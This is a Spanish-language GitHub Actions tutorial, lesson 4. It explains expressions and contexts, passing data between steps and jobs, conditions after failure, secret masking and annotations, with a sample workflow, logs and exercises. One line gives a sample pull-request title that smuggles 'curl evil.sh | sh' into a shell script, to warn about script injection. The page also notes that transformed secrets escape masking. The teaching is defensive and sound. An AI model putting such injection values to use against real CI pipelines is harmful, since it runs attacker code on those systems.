---
title: 4. Expresiones, contextos y salidas
description: Expresiones ${{ }} y contextos, variables de entorno, salidas de steps y de jobs, condiciones después de un fallo, secretos enmascarados y anotaciones.
sidebar:
  order: 4
---

## Dos tipos de sustitución

La [lección 1](../01-first-workflow/) mostró que `${{ github.event_name }}` ya estaba reemplazado en el script que ejecutó el runner, mientras que `$RUNNER_OS` lo expandía bash. Mantén separadas las dos cosas:

| | `${{ expression }}` | `$VAR` / `$env:VAR` |
|---|---|---|
| Evaluado por | GitHub, antes de que se ejecute el step | el shell, mientras se ejecuta el step |
| Puede leer | contextos: `github`, `env`, `vars`, `secrets`, `inputs`, `matrix`, `steps`, `needs`, `job`, `runner` | variables de entorno |
| Permitido en | casi cualquier valor del YAML, y `if:` | solo dentro de scripts |
| Analogía en C# | un generador de código fuente: el texto se produce antes de la compilación | una variable leída en tiempo de ejecución |

Como `${{ }}` pega texto en el script, **nunca** pongas directamente valores que no son de confianza — un título de pull request como `"; curl evil.sh | sh; echo "` se convertiría en código de shell. Pásalos por `env:` y lee `$VAR` en su lugar. La [lección 7](../07-security/) ejecuta la inyección de verdad.

## El workflow

[`.github/workflows/gha-04-data.yml`](https://github.com/spareilleux/learn/blob/main/.github/workflows/gha-04-data.yml):

```yaml
# GitHub Actions course, lesson 4: expressions, contexts, environment, outputs, conditions
name: "GHA 04: data between steps and jobs"

on:
  workflow_dispatch:
    inputs:
      fail:
        description: Make the test step fail
        type: boolean
        default: false
  push:
    branches: [main]
    paths: ['.github/workflows/gha-04-data.yml']

env:
  COURSE: github-actions

jobs:
  produce:
    runs-on: ubuntu-latest
    outputs:
      version: ${{ steps.version.outputs.value }}
    env:
      LESSON: '04'
    steps:
      - name: Expressions and contexts
        run: |
          echo "course=$COURSE lesson=$LESSON"
          echo "run ${{ github.run_number }}, attempt ${{ github.run_attempt }}"
          echo "is main: ${{ github.ref == 'refs/heads/main' }}"
          echo "upper: ${{ format('{0}-{1}', env.COURSE, env.LESSON) }}"

      - name: Compute a version
        id: version
        run: echo "value=1.0.${{ github.run_number }}" >> "$GITHUB_OUTPUT"

      - name: Export a variable for later steps
        run: echo "BUILD_LABEL=build-${{ steps.version.outputs.value }}" >> "$GITHUB_ENV"

      - name: Read it back
        run: echo "BUILD_LABEL is $BUILD_LABEL"

      - name: A secret is masked in logs
        env:
          TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          echo "token length: ${#TOKEN}"
          echo "token: $TOKEN"

      - name: Tests (fail on demand)
        run: |
          if [ "${{ inputs.fail }}" = "true" ]; then
            echo "::error file=code/github-actions/dotnet/Slugs/Slug.cs,line=9::Pretend a test failed"
            exit 1
          fi
          echo "tests passed"

      - name: Only on failure
        if: failure()
        run: echo "a previous step failed"

      - name: Always
        if: always()
        run: |
          echo "job status: ${{ job.status }}"
          echo "### Version ${{ steps.version.outputs.value }}" >> "$GITHUB_STEP_SUMMARY"

  consume:
    needs: produce
    runs-on: ubuntu-latest
    steps:
      - run: echo "version from produce = ${{ needs.produce.outputs.version }}"
```

## Ejecución 1: todo pasa

El primer step, tal como lo recibió el runner y tal como lo imprimió:

```text
echo "course=$COURSE lesson=$LESSON"
echo "run 1, attempt 1"
echo "is main: true"
echo "upper: github-actions-04"
course=github-actions lesson=04
run 1, attempt 1
is main: true
upper: github-actions-04
```

- `env:` a nivel de workflow (`COURSE`) y a nivel de job (`LESSON`) se convirtieron ambos en variables de entorno; cuando los nombres coinciden, gana el nivel más específico.
- `github.run_number` cuenta las ejecuciones **de este workflow** (1 aquí, es nuevo); `run_attempt` aumenta cuando haces clic en *Re-run*.
- `==` devuelve `true` / `false`; `format()` es una de las funciones integradas, junto con `contains()`, `startsWith()`, `toJSON()`, `hashFiles()`…

### Pasar datos entre steps

Dos archivos especiales se encargan de ello:

| Escribir en | Sintaxis | Leer después como |
|---|---|---|
| `$GITHUB_OUTPUT` | `name=value` | `${{ steps.<id>.outputs.<name> }}` (el step necesita un `id`) |
| `$GITHUB_ENV` | `NAME=value` | `$NAME` en los steps **siguientes** (no en el actual) |

```text
echo "value=1.0.1" >> "$GITHUB_OUTPUT"
echo "BUILD_LABEL=build-1.0.1" >> "$GITHUB_ENV"
...
  BUILD_LABEL: build-1.0.1
BUILD_LABEL is build-1.0.1
```

A partir del step que sigue a la exportación, el log lista `BUILD_LABEL` en el bloque `env:` del step.

### Pasar datos entre jobs

Los jobs se ejecutan en máquinas distintas, así que una salida de step debe **declararse** como salida del job (`jobs.produce.outputs.version`), y el consumidor debe declarar `needs: produce`:

```text
version from produce = 1.0.1
```

Sin `needs`, `consume` arrancaría al mismo tiempo que `produce` y `needs.produce` no existiría.

### Los secretos se enmascaran

```text
  TOKEN: ***
token length: 377
token: ***
```

El runner reemplaza por `***` en los logs cada aparición del valor de un secreto, incluso cuando un script lo imprime. La longitud sigue filtrándose — y el enmascaramiento se basa en el valor exacto: un secreto transformado por el script (codificado en base64, troceado, invertido) no se reconoce. El enmascaramiento protege contra los accidentes, no contra un step malicioso.

## Ejecución 2: fallar a demanda

```powershell
gh workflow run gha-04-data.yml --field fail=true
```

```text
if [ "true" = "true" ]; then
  echo "::error file=code/github-actions/dotnet/Slugs/Slug.cs,line=9::Pretend a test failed"
  exit 1
fi
##[error]Pretend a test failed
##[error]Process completed with exit code 1.
```

Lo que pasó con los steps y los jobs posteriores:

```text
produce  failure
  Tests (fail on demand)  failure
  Only on failure         success
  Always                  success
consume  skipped
```

- Cada step tiene un `if: success()` implícito: después de un fallo, los steps normales se omiten. `failure()` se ejecuta solo si un step anterior falló; `always()` se ejecuta pase lo que pase — incluso después de una cancelación.
- `job.status` valía `failure` en el step `Always`: `echo "job status: failure"`.
- `consume` se **omitió**, no falló: `needs` también implica éxito. Escribe `if: always()` en el job (o `if: ${{ !cancelled() }}`) para ejecutarlo de todos modos.

### Anotaciones

`::error file=…,line=…::message` es un **comando de workflow**: el runner lo convierte en una anotación asociada a ese archivo y esa línea, visible en el resumen de la ejecución y en la pestaña *Files changed* del pull request. A través de la API:

```powershell
gh api repos/spareilleux/learn/check-runs/<job-id>/annotations --jq '.[] | "\(.annotation_level) \(.path):\(.start_line) \(.message)"'
```

```text
failure .github:14 Process completed with exit code 1.
failure code/github-actions/dotnet/Slugs/Slug.cs:9 Pretend a test failed
```

`::warning` y `::notice` funcionan igual. Y `$GITHUB_STEP_SUMMARY` acepta Markdown: la línea `### Version 1.0.2` del step `Always` aparece como encabezado en la página de resumen de la ejecución.

## Puntos clave

- `${{ }}` lo evalúa GitHub y lo pega como texto; `$VAR` lo lee el shell. Los valores que no son de confianza pasan por `env:`.
- `$GITHUB_OUTPUT` → `steps.<id>.outputs`; `$GITHUB_ENV` → variables para los steps siguientes; `outputs` del job + `needs` → datos entre jobs.
- Después de un fallo, solo se ejecutan los steps con `failure()` y `always()`, y los jobs dependientes se omiten.
- Los secretos se enmascaran por valor en los logs, lo cual es una red de seguridad, no una frontera de seguridad.
- `::error file=,line=::` crea anotaciones; `$GITHUB_STEP_SUMMARY` escribe el resumen de la ejecución.

## Ejercicios

1. En el step `Export a variable for later steps`, añade `echo "now: $BUILD_LABEL"` después de la línea `>> "$GITHUB_ENV"`. ¿Qué imprime?

<details>
<summary>Solución</summary>

`now: ` seguido de nada. Comprobado con [`gha-04-exercises.yml`](https://github.com/spareilleux/learn/blob/main/.github/workflows/gha-04-exercises.yml):

```text
now: 
next: build-1
```

El runner lee `$GITHUB_ENV` **entre** steps: la variable existe a partir del step siguiente. Dentro del mismo step, usa una variable de shell normal.

</details>

2. Haz que `consume` se ejecute aunque `produce` falle, pero no cuando la ejecución se cancela. ¿Qué contendrá `needs.produce.outputs.version` después de la ejecución fallida?

<details>
<summary>Solución</summary>

De [`.github/workflows/gha-04-exercises.yml`, líneas 28-30](https://github.com/spareilleux/learn/blob/93f6f82/.github/workflows/gha-04-exercises.yml#L28-L30):

```yaml
  consume:
    needs: produce
    if: ${{ !cancelled() }}
```

La versión: se escribió en `$GITHUB_OUTPUT` antes del step fallido, y las salidas del job se evalúan al final del job sea cual sea su resultado. La salida de un step que nunca se ejecutó es una cadena vacía. El workflow de comprobación declara ambas y falla entre las dos:

```text
produce result: failure
version: '1.0.1'
never:   ''
```

</details>

3. Un workflow se ejecuta con `pull_request` e imprime el título con `run: echo "Title: ${{ github.event.pull_request.title }}"`. Reescribe el step de forma segura.

<details>
<summary>Solución</summary>

```yaml
      - name: Show the title
        env:
          TITLE: ${{ github.event.pull_request.title }}
        run: echo "Title: $TITLE"
```

La expresión ahora solo se usa como valor de una variable de entorno; bash lee `$TITLE` como datos y nunca analiza su contenido como código.

</details>

## Fuentes

- [Evaluar expresiones en workflows y actions](https://docs.github.com/actions/reference/workflows-and-actions/expressions)
- [Referencia de contextos](https://docs.github.com/actions/reference/workflows-and-actions/contexts)
- [Comandos de workflow para GitHub Actions](https://docs.github.com/actions/reference/workflows-and-actions/workflow-commands)
- [Pasar información entre jobs](https://docs.github.com/actions/how-tos/write-workflows/choose-what-workflows-do/pass-job-outputs)
- [Refuerzo de la seguridad: entender el riesgo de las inyecciones de scripts](https://docs.github.com/actions/concepts/security/script-injections)
